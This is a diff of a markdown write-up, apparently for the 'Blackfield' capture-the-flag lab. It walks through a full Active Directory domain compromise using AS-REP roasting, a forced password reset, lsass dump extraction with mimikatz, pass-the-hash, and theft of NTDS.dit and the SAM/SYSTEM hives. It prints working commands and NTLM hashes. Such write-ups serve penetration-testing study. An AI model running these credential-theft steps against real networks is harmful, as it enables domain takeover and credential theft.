@@ -219,9 +219,7 @@ For now I cannot make a lot of sense of this share!!
 
 ---
 
-### 500.1 Password Attacks
-
-##### 500.2 ASP-REP Roasting
+### 500.2 ASP-REP Roasting
 
 ```sh
 python3 GetNPUsers.py \
@@ -250,22 +248,195 @@ hashcat -a0 -w3  -m18200 -ocracked.txt asprep.hashcat rockyou.txt
 ![](images/cracked.png)
 
 
-| account   | password        |
-| --------- | --------------- |
-| audit2020 | #00^BlackKnight |
+| account | password        |
+| ------- | --------------- |
+| support | #00^BlackKnight |
 
-##### 500.3 Password Reuse Attacks
 
-We were able to authenticate with the cracked password and the  `support`account. 
-However I could not login with `audit2020`! maybe the account is locked ? 
+Still we cannot access `/forensic`
+![](images/noforensic.png)
+
+---
+
+###### 600.1 Attack Development : Bloodhound
+
 
 ```sh
-./kerbrute passwordspray -d blackfield.local users.txt '#00^BlackKnight'
+bloodhound-python \
+	-u 'support@blackfield.local' \
+	-p '#00^BlackKnight' \
+	-d 'blackfield.local' \
+	-c all \
+	--zip
 ```
-![](images/support.png)
+![](images/collector.png)
+
+The account `support@blackfield.local` can change `audit2020@blackfield.local` password.  Because it has the `ForceChangePassword` on the target account.
+
+![](images/forcechangepassword.png)
 
 
-| account   | password        |
-| --------- | --------------- |
-| audit2020 | #00^BlackKnight |
-| support   | #00^BlackKnight |
+`SVC_BACKUP`is member of  the `Remote Management Users`and can be use to get `initial access` on the Domain Controller.
+
+![](images/remote.png)
+
+The account `svc_backup`is member of the backup operators group! We could `privesc`using this account! 
+
+
+![](images/backup_operators.png)
+
+
+So the plan is:
+	- Change password for user `audit2020`.
+	- Enumerate share `/forensic`for information that leads to the  compromise of `svc_backup`.
+	- Get initial access using `svc_backup`and `evil-winrm`.
+	- leverage the `Backup Operatos`group to `privesc`
+
+---
+
+### 700.1 Horizontal Movement
+###### Abusing `PasswordForceChange`
+
+
+```sh
+rpcclient -U 'support'%'#00^BlackKnight' dc01
+```
+```vb
+setuserinfo2 audit2020 23 '#00^BlackKnight'
+```
+![](images/changepw.png)
+
+let's test it.
+
+```sh
+nxc smb -u 'audit' -p '#00^BlackKnight' --shares  dc01.blackfield.local
+```
+![](images/intel.png)
+
+Nice! it worked just as planned! 
+
+---
+
+### 800.1 Looting
+
+```sh
+smbclient -U 'audit2020'%'#00^BlackKnight'  //dc01/forensic
+```
+
+It looks at some point in the past the system was compromised! The analysts generated memory dumps to investigate the event. Including from the `lsass.exe`process.
+
+![](images/memory.png)
+
+###### 800.2 Local Security Authority Subsystem Service
+
+`lsass`process  verifies users logging on the system. It may store encrypted credentials on memory! 
+
+![](images/lsass.png)
+
+https://attack.mitre.org/techniques/T1003/001/
+
+![](images/mitre.png)
+
+We don't even need the plain text credential. Retrieving a  `nt` hash for `svc_backup`or `administrator`would suffice. 
+
+```sh
+smbget -U 'BLACKFIELD/audit2020'%'#00^BlackKnight' \
+	smb://dc01/forensic/memory_analysis/lsass.zip
+```
+![](images/exfiltrated.png)
+
+
+We need to run `mimikatz.exe`  x64 as administrator to dump the credentials from  the process dump.
+
+```
+sekurlsa::Minidump lsass.DMP
+````
+
+```
+sekurlsa::logonPasswords
+```
+
+![](images/minidump.png)
+
+
+Cool we extract two NTLM hashes
+
+```
+svc_backup: 9658d1d1dcd9250115e2205d9f48400d
+administrator: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+```
+
+It looks like they changed the administrator after the breach!
+
+However we successfully compromised `svc_backup`as planned! 
+```sh
+nxc winrm -u 'svc_backup' \
+	-H 9658d1d1dcd9250115e2205d9f48400d \
+	-d blackfield.local  \
+	dc01.blackfield.local
+```
+![](images/worked.png)
+
+
+---
+
+### 900.1 Stealing `NTDS.dit` 
+
+First let's get initial access on the domain controller using a `pass-the-hash` technique. 
+
+```sh
+evil-winrm \
+	-i 'dc01.blackfield.local' \
+	-u 'svc_backup@blackfield.local' \
+	-H '9658d1d1dcd9250115e2205d9f48400d'
+```
+
+
+We can check our `access tokens`with `whoami /priv`.
+
+```
+whoami /priv
+```
+
+
+We can leverage our `privs` `SeBackup`and `SeRestore`to steal the database that stores domain credentials `ntds.dit`.
+
+First wen need to create a shadow copy of the `c:\`drive. Because we cannot open the `NTDS.dit`database while it is in use.
+
+- run `diskshadow.exe`
+```
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% F:
+end backup
+exit
+```
+
+Then we need to use `robocopy`to access extract the database.
+```
+robocopy /B F:\Windows\NTDS .\ntds ntds.dit
+```
+
+Now let's extract the `system`and `sam`hives. 
+```
+reg save HKLM\SYSTEM system
+reg save HKLM\SAM sam
+```
+
+And now we can use impacket's `secretsdump` to extract the hashes.
+
+```
+python3 secretsdump.py -ntds ntds.dit -system system -sam sam LOCAL
+```
+
+Perfect! Now time to `Pass-The-Hash`.
+
+```
+python3 smbexec.py \
+	-hashes :nt \
+	blackfield.local/administrator@dc01.blackfied.local
+```
